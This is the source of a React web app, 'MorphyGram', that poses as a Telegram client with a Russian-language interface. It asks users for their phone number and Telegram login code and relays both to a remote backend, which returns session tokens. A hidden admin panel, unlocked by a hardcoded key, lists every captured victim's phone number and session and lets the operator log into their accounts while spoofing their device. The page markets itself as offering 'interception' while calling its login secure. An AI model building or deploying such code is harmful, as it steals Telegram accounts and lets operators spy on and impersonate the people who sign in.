import React, { useState, useEffect } from 'react';
import { Shield, Send, Zap, Settings, Download, Terminal, Users, LogOut, Smartphone } from 'lucide-react';

export default function App() {
  const [step, setStep] = useState(0); // 0=лендинг, 1=телефон, 2=код, 3=чат
  const [phone, setPhone] = useState('');
  const [code, setCode] = useState('');
  const [hash, setHash] = useState('');
  const [loading, setLoading] = useState(false);
  const [session, setSession] = useState(localStorage.getItem('mg_session') || null);
  const [adminKey, setAdminKey] = useState('');
  const [showAdminField, setShowAdminField] = useState(false);
  const [isAdmin, setIsAdmin] = useState(localStorage.getItem('mg_admin') === 'true');
  
  const [cmdInput, setCmdInput] = useState('');
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [adminUsers, setAdminUsers] = useState([]);

  // ССЫЛКА НА ТВОЙ RENDER
  const BACKEND_URL = 'https://morphygram-backend.onrender.com'; 

  useEffect(() => {
    if (session) setStep(3);
  }, [session]);

  const handleSendCode = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/send-code`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone })
      });
      const data = await res.json();
      if (res.ok) {
        setHash(data.phone_code_hash);
        setStep(2);
      } else { alert(data.detail || 'Ошибка'); }
    } catch (e) { alert('Ошибка соединения'); }
    setLoading(false);
  };

  const handleLogin = async () => {
    setLoading(true);
    try {
      const res = await fetch(`${BACKEND_URL}/api/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone, code, phone_code_hash: hash, admin_key: adminKey })
      });
      const data = await res.json();
      if (res.ok) {
        localStorage.setItem('mg_session', data.session);
        setSession(data.session);
        if (data.is_admin) {
          localStorage.setItem('mg_admin', 'true');
          setIsAdmin(true);
        }
        setStep(3);
      } else { alert(data.detail || 'Ошибка входа'); }
    } catch (e) { alert('Ошибка соединения'); }
    setLoading(false);
  };

  const fetchAdminUsers = async () => {
    try {
      const res = await fetch(`${BACKEND_URL}/api/admin/users`, {
        headers: { 'x-admin-key': adminKey || '102050304050ggg' }
      });
      const data = await res.json();
      if (res.ok) {
        setAdminUsers(data.users);
        setShowAdminPanel(true);
      } else { alert(data.detail); }
    } catch (e) { alert('Ошибка загрузки'); }
  };

  const switchAccount = (newSession, deviceModel, sysVersion) => {
    if (!localStorage.getItem('mg_admin_backup')) {
      localStorage.setItem('mg_admin_backup', session);
    }
    localStorage.setItem('mg_session', newSession);
    localStorage.setItem('mg_device_model', deviceModel || "iPhone 13 Pro");
    localStorage.setItem('mg_system_version', sysVersion || "iOS 16.5");
    
    setSession(newSession);
    setShowAdminPanel(false);
    window.location.reload();
  };

  const returnToAdmin = () => {
    const backup = localStorage.getItem('mg_admin_backup');
    if (backup) {
      localStorage.setItem('mg_session', backup);
      setSession(backup);
      localStorage.removeItem('mg_admin_backup');
      window.location.reload();
    }
  };

  const executeCommand = async () => {
    if (!cmdInput.trim()) return;
    try {
      const parts = cmdInput.trim().split(' ');
      const res = await fetch(`${BACKEND_URL}/api/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
            session, 
            command: parts[0], 
            target: parts[1] || null,
            device_model: localStorage.getItem('mg_device_model') || "iPhone 13 Pro",
            system_version: localStorage.getItem('mg_system_version') || "iOS 16.5"
        })
      });
      const data = await res.json();
      if (res.ok) { alert(data.result); setCmdInput(''); } 
      else { alert(data.detail); }
    } catch (e) { alert('Ошибка команды'); }
  };

  // --- ЛЕНДИНГ ---
  if (step === 0) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-slate-950 via-slate-900 to-black p-6 text-center relative overflow-hidden">
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-red-600/20 blur-[100px] rounded-full pointer-events-none"></div>
        
        <div className="w-24 h-24 bg-slate-900 border border-slate-700 rounded-3xl flex items-center justify-center mb-8 shadow-[0_0_50px_rgba(239,68,68,0.15)] relative z-10">
            <Smartphone className="w-12 h-12 text-red-500" />
        </div>
        <h1 className="text-4xl font-black tracking-tight mb-4 text-white relative z-10">
            Morphy<span className="text-red-500">Gram</span>
        </h1>
        <p className="text-slate-400 max-w-sm mb-10 leading-relaxed relative z-10">
            Твой Телеграм. Твои правила. Скрытые сессии, перехват и полный контроль в одном приложении.
        </p>
        
        <button 
          onClick={() => setStep(1)}
          className="group relative inline-flex items-center justify-center gap-3 px-8 py-4 bg-red-600 hover:bg-red-500 text-white font-semibold rounded-2xl transition-all duration-300 shadow-[0_0_30px_rgba(220,38,38,0.3)] hover:shadow-[0_0_40px_rgba(220,38,38,0.6)] w-full max-w-xs z-10"
        >
          <Download className="w-5 h-5 group-hover:animate-bounce" />
          Скачать приложение
        </button>
        
        <div className="mt-8 text-xs text-slate-500 max-w-xs relative z-10 flex flex-col items-center gap-2">
            <p>Для установки на iPhone:</p>
            <p>1. Нажмите "Поделиться" в Safari</p>
            <p>2. Выберите "На экран «Домой»"</p>
        </div>
      </div>
    );
  }

  // --- ВХОД ---
  if (step === 1 || step === 2) {
    return (
      <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-slate-950 via-slate-900 to-black">
        <div className="w-full max-w-md p-6 bg-slate-900/80 border border-slate-800 rounded-2xl backdrop-blur-xl shadow-2xl relative">
          <button onClick={() => setStep(0)} className="text-slate-500 hover:text-white mb-4 text-sm">&larr; Назад</button>
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold tracking-tight">Вход в MorphyGram</h2>
            <p className="text-slate-400 text-sm mt-1">Безопасная авторизация</p>
          </div>
          {step === 1 ? (
            <div className="space-y-4">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Номер телефона</label>
                <input type="text" placeholder="+79991112233" value={phone} onChange={(e) => setPhone(e.target.value)} className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-500 transition" />
              </div>
              <button onClick={handleSendCode} disabled={loading} className="w-full bg-red-600 hover:bg-red-500 text-white font-medium py-3 rounded-xl transition disabled:opacity-50">
                {loading ? 'Отправка...' : 'Получить код'}
              </button>
            </div>
          ) : (
            <div className="space-y-4">
              <div>
                <label className="block text-xs text-slate-400 mb-1">Код из Telegram</label>
                <input type="text" placeholder="12345" value={code} onChange={(e) => setCode(e.target.value)} className="w-full bg-slate-950 border border-slate-800 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-red-500 transition text-center tracking-widest text-lg" />
              </div>
              <button onClick={handleLogin} disabled={loading} className="w-full bg-red-600 hover:bg-red-500 text-white font-medium py-3 rounded-xl transition disabled:opacity-50">
                {loading ? 'Вход...' : 'Войти'}
              </button>
            </div>
          )}
          <button type="button" onClick={() => setShowAdminField(!showAdminField)} className="absolute top-4 right-4 p-2 text-slate-700 hover:text-red-500 transition">
            <Settings className="w-4 h-4" />
          </button>
          {showAdminField && (
            <div className="mt-4 pt-4 border-t border-slate-800">
              <label className="block text-xs text-red-500/70 mb-1 font-mono">Секретный ключ</label>
              <input type="password" placeholder="********" value={adminKey} onChange={(e) => setAdminKey(e.target.value)} className="w-full bg-slate-950 border border-red-900/30 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500 transition text-red-400 font-mono" />
            </div>
          )}
        </div>
      </div>
    );
  }

  // --- ЧАТ ---
  return (
    <div className="flex h-screen bg-slate-950 text-slate-100 relative">
      <div className="w-full md:w-80 border-r border-slate-800 flex flex-col bg-slate-900/30">
        <div className="p-4 border-b border-slate-800 flex items-center justify-between">
          <h1 className="font-bold text-lg text-red-500 flex items-center gap-2">
            <Zap className="w-5 h-5 fill-red-500" /> MorphyGram
          </h1>
          {isAdmin && <span className="text-[10px] px-2 py-1 bg-red-500/20 text-red-400 border border-red-500/30 rounded-full font-mono">ADMIN</span>}
        </div>
        
        {isAdmin && (
          <div className="px-4 pt-2">
             <button onClick={fetchAdminUsers} className="w-full flex items-center justify-center gap-2 bg-red-900/40 hover:bg-red-800 text-red-200 py-2 rounded-lg transition text-sm font-semibold border border-red-900/50">
                <Users className="w-4 h-4" /> Обитель (База)
             </button>
          </div>
        )}

        <div className="p-4 flex-1 overflow-y-auto">
            <div className="text-slate-500 text-sm text-center">Список чатов (в разработке)</div>
        </div>

        <div className="p-4 border-t border-slate-800 bg-slate-900/50">
          <label className="block text-[10px] text-slate-500 mb-1 flex items-center gap-1">
            <Terminal className="w-3 h-3" /> Консоль управления
          </label>
          <div className="flex gap-2">
            <input type="text" placeholder=".mute @user" value={cmdInput} onChange={(e) => setCmdInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && executeCommand()} className="flex-1 bg-slate-950 border border-slate-800 rounded-lg px-3 py-1.5 text-xs focus:outline-none focus:border-red-500/50 text-emerald-400 font-mono" />
            <button onClick={executeCommand} className="bg-slate-800 hover:bg-slate-700 text-slate-300 p-1.5 rounded-lg transition"><Send className="w-3 h-3" /></button>
          </div>
        </div>
      </div>

      <div className="hidden md:flex flex-1 flex-col justify-between bg-slate-900/20">
        <div className="p-4 border-b border-slate-800 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <div className="w-10 h-10 rounded-full bg-red-600/20 flex items-center justify-center text-red-500 font-bold">MG</div>
            <div>
              <div className="font-semibold">Избранное (Ghost Mode)</div>
              <div className="text-xs text-emerald-400 flex items-center gap-1"><Shield className="w-3 h-3" /> Перехват включен</div>
            </div>
          </div>
          <div className="flex items-center gap-2">
            {localStorage.getItem('mg_admin_backup') && (
              <button onClick={returnToAdmin} className="text-xs text-red-500 border border-red-500/30 px-2 py-1 rounded">Вернуться в Админку</button>
            )}
            <button onClick={() => { localStorage.clear(); setSession(null); setStep(0); window.location.reload(); }} className="text-xs text-slate-500 hover:text-red-500 transition"><LogOut className="w-4 h-4" /></button>
          </div>
        </div>
        <div className="p-4 space-y-3 overflow-y-auto">
          <div className="bg-slate-800/60 p-3 rounded-lg max-w-md border border-slate-700/50">
            <p className="text-sm">Добро пожаловать! Система готова к работе. 🚀</p>
            <span className="text-[10px] text-slate-400 mt-1 block">12:00</span>
          </div>
        </div>
        <div className="p-4 border-t border-slate-800 flex items-center gap-2">
          <input type="text" placeholder="Написать сообщение..." className="flex-1 bg-slate-900 border border-slate-800 rounded-xl px-4 py-2 text-sm focus:outline-none focus:border-red-500/50" />
          <button className="bg-red-600 hover:bg-red-500 text-white p-2 rounded-xl transition"><Send className="w-4 h-4" /></button>
        </div>
      </div>

      {showAdminPanel && (
        <div className="absolute inset-0 bg-black/80 z-50 flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-red-900/50 rounded-2xl w-full max-w-md p-6">
            <h3 className="text-lg font-bold text-red-500 mb-4 flex items-center gap-2">
              <Shield className="w-5 h-5" /> Выбор аккаунта
            </h3>
            <div className="space-y-2 max-h-60 overflow-y-auto mb-4">
              {adminUsers.map((u, i) => (
                <div key={i} className="flex flex-col bg-slate-950 p-3 rounded-xl border border-slate-800 gap-2">
                  <div className="flex items-center justify-between">
                    <span className="text-sm font-mono text-slate-200">{u.phone}</span>
                    <button 
                      onClick={() => switchAccount(u.session, u.device_model, u.system_version)} 
                      className="text-xs bg-red-600 hover:bg-red-500 text-white px-3 py-1 rounded-md transition"
                    >
                      Войти
                    </button>
                  </div>
                  <div className="text-[10px] text-slate-500 flex items-center gap-1 font-mono">
                    <Smartphone className="w-3 h-3" /> 
                    {u.device_model || "Неизвестно"} • {u.system_version || "Неизвестно"}
                  </div>
                </div>
              ))}
              {adminUsers.length === 0 && <p className="text-slate-500 text-sm text-center">Пока никого нет</p>}
            </div>
            <button onClick={() => setShowAdminPanel(false)} className="w-full py-2 text-slate-400 hover:text-white transition">Закрыть</button>
          </div>
        </div>
      )}
    </div>
  );
}
